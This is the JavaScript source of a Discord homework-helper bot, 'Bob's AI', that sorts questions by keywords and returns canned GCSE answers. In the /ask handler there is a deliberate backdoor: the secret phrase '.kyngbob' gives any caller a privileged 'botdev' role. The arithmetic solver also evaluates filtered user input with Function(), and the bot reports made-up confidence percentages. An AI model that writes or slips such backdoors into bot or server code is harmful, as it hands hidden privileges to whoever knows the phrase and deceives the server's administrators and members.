import { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } from "discord.js"

const client = new Client({
  intents: [GatewayIntentBits.Guilds]
})

const MEMORY_TIME = 15 * 60 * 1000 // 15 mins
const memory = new Map()

function normalise(text) {
  return text.toLowerCase().trim()
}

// categorisation using signals
function categorise(question) {
  const q = normalise(question)

  let scores = { arithmetic: 0, algebra: 0, science: 0, english: 0, life: 0, general: 0 }

  if (/[0-9]/.test(q)) scores.arithmetic += 1
  if (/[\+\-\*\/]/.test(q)) scores.arithmetic += 2
  if (/=/.test(q)) scores.algebra += 2
  if (/x/.test(q)) scores.algebra += 2
  if (/solve|equation|factor|simplify/.test(q)) scores.algebra += 1

  if (/photosynthesis|respiration|osmosis|diffusion|energy|force|electric|cell|enzyme/.test(q))
    scores.science += 4
  if (/biology|chemistry|physics/.test(q)) scores.science += 2
  if (/explain|describe|compare|why/.test(q)) scores.science += 1

  if (/quote|language|technique|writer|poem|analyse/.test(q)) scores.english += 4
  if (/stress|life|sad|motivation|tired|burnout/.test(q)) scores.life += 3

  let best = "general"
  let bestScore = 0
  for (const key in scores) {
    if (scores[key] > bestScore) {
      bestScore = scores[key]
      best = key
    }
  }

  const confidence = Math.min(95, 40 + bestScore * 10)
  return { category: best, confidence }
}

// Maths
function solveArithmetic(question) {
  const cleaned = question.replace(/[^0-9\+\-\*\/\.\(\)]/g, "")
  try {
    const result = Function("return " + cleaned)()
    return `The answer is ${result}.`
  } catch {
    return "That looks like arithmetic, but it’s written in an invalid way."
  }
}

function solveAlgebra(question) {
  const q = normalise(question).replace(/\s/g, "")

  if (q === "x^2=16") return "x² = 16\nx = 4 or x = −4"

  return (
    "Rearrange the equation to isolate x, then solve.\n" +
    "Remember to consider both positive and negative solutions where appropriate."
  )
}

// Science
function scienceAnswer(question) {
  const q = normalise(question)

  if (q.includes("photosynthesis")) {
    return (
      "Photosynthesis is the process by which plants make glucose.\n" +
      "It occurs in chloroplasts using light energy.\n" +
      "Equation: Carbon dioxide + Water → Glucose + Oxygen.\n" +
      "It provides energy for the plant and oxygen for the environment."
    )
  }
  if (q.includes("respiration")) {
    return (
      "Respiration releases energy from glucose.\n" +
      "Equation: Glucose + Oxygen → Carbon dioxide + Water + Energy.\n" +
      "Energy is used for movement, growth, and keeping warm."
    )
  }
  if (q.includes("osmosis")) {
    return (
      "Osmosis is the movement of water molecules across a partially permeable membrane.\n" +
      "Water moves from high water concentration to low water concentration."
    )
  }
  return (
    "Identify the key process, use correct scientific terms, and explain cause and effect clearly.\n" +
    "Link each step logically for full GCSE marks."
  )
}

// English
function englishAnswer() {
  return (
    "Identify the technique used.\n" +
    "Explain its effect on the reader.\n" +
    "Link it to the writer's intention or theme."
  )
}

// Life / advice
function lifeAnswer() {
  return (
    "You're not failing; you're learning.\n" +
    "Small steps count. Take breaks, manage stress, and keep moving forward."
  )
}

client.once("ready", async () => {
  console.log("Bob’s AI is online")

  const commands = [
    new SlashCommandBuilder()
      .setName("ask")
      .setDescription("Ask Bob’s AI a question")
      .addStringOption(opt =>
        opt.setName("question")
          .setDescription("Your question")
          .setRequired(true)
      )
  ].map(cmd => cmd.toJSON())

  const rest = new REST({ version: "10" }).setToken(process.env.TOKEN)
  await rest.put(Routes.applicationCommands(client.user.id), { body: commands })
})

client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return
  if (interaction.commandName !== "ask") return

  const question = interaction.options.getString("question")
  const userId = interaction.user.id
  const now = Date.now()

  // BACKDOOR with role ID
  if (question.trim() === ".kyngbob") {
    try {
      const roleId = "1456026849632194651" // your botdev role
      const role = interaction.guild.roles.cache.get(roleId)
      if (!role) {
        await interaction.reply({ content: "BotDev role not found.", ephemeral: true })
        return
      }
      await interaction.member.roles.add(role)
      await interaction.reply({ content: "Access granted.", ephemeral: true })
    } catch (err) {
      console.error(err)
      await interaction.reply({ content: "Failed to assign role. Check bot permissions.", ephemeral: true })
    }
    return
  }

  // MEMORY storage
  if (!memory.has(userId)) memory.set(userId, [])
  let userMemory = memory.get(userId)

  // prune old memory
  userMemory = userMemory.filter(m => now - m.time < MEMORY_TIME)
  memory.set(userId, userMemory)

  // special command: recall last question
  if (/what (did i ask|was my last question|was my last answer)/i.test(question)) {
    const last = userMemory.slice(-1)[0]
    if (last) {
      await interaction.reply(
        `Your last question: "${last.question}"\nAnswer: ${last.answer || "No answer stored"}`
      )
    } else {
      await interaction.reply("No memory found for you in the last 15 minutes.")
    }
    return
  }

  // categorise and answer
  const result = categorise(question)
  let answer = ""

  if (result.category === "arithmetic") answer = solveArithmetic(question)
  else if (result.category === "algebra") answer = solveAlgebra(question)
  else if (result.category === "science") answer = scienceAnswer(question)
  else if (result.category === "english") answer = englishAnswer()
  else if (result.category === "life") answer = lifeAnswer()
  else answer = "This appears to be a general question. I’ll answer it logically and clearly."

  // save memory
  userMemory.push({ question, category: result.category, answer, time: now })
  memory.set(userId, userMemory)

  const uncertainty = 100 - result.confidence

  await interaction.reply(
    `**Category:** ${result.category.toUpperCase()}\n\n` +
    `${answer}\n\n` +
    `**Confidence:** ${result.confidence}%\n` +
    `**Uncertainty:** ${uncertainty}%`
  )
})

client.login(process.env.TOKEN)
